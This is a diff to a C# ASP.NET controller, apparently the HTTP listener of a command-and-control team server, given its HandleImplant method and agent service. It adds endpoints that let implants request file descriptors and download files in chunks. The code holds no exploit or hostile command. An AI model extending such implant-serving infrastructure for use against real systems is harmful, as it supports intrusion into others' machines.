@@ -1,4 +1,5 @@
-﻿using Microsoft.AspNetCore.Http;
+﻿using ApiModels.Response;
+using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Newtonsoft.Json;
 using System;
@@ -14,10 +15,12 @@ namespace TeamServer.Models
     public class HttpListenerController : ControllerBase
     {
         private IAgentService _agentService;
+        private IFileService _fileService;
 
-        public HttpListenerController(IAgentService agentService)
+        public HttpListenerController(IAgentService agentService, IFileService fileService)
         {
             this._agentService=agentService;
+            this._fileService = fileService;
         }
 
         public async Task<IActionResult> HandleImplant()
@@ -70,14 +73,43 @@ namespace TeamServer.Models
             return JsonConvert.DeserializeObject<AgentMetadata>(json);
         }
 
-        public async Task<IActionResult> Download()
+        public IActionResult SetupDownload(int filetype, string filename)
         {
-            return Ok();
+            string fullPath = this._fileService.GetFullPath((FileType)filetype, filename);
+            if (string.IsNullOrEmpty(fullPath))
+                return NotFound();
+
+            var desc = _fileService.CreateFileDescriptor(fullPath);
+            if (desc == null)
+                return NotFound();
+
+            return Ok(new FileDescriptorResponse()
+            {
+                Id = desc.Id,
+                Name = desc.Name,
+                Length = desc.Length,
+                ChunkCount = desc.ChunkCount,
+                ChunkSize = desc.ChunkSize,
+            });
         }
 
-        public async Task<IActionResult> DownloadChunk()
+        public IActionResult DownloadChunk(string id, int index)
         {
-            return Ok();
+            var desc = _fileService.GetFile(id);
+            if (index < 0 || index >= desc.ChunkCount)
+                return NotFound();
+
+            var chunck = desc.Chunks[index];
+            chunck.IsDownloaded = true;
+
+            _fileService.CleanDownloaded();
+
+            return Ok(new FileChunckResponse()
+            {
+                Data = chunck.Data,
+                FileId = chunck.FileId,
+                Index = chunck.Index,
+            });
         }
     }
 }
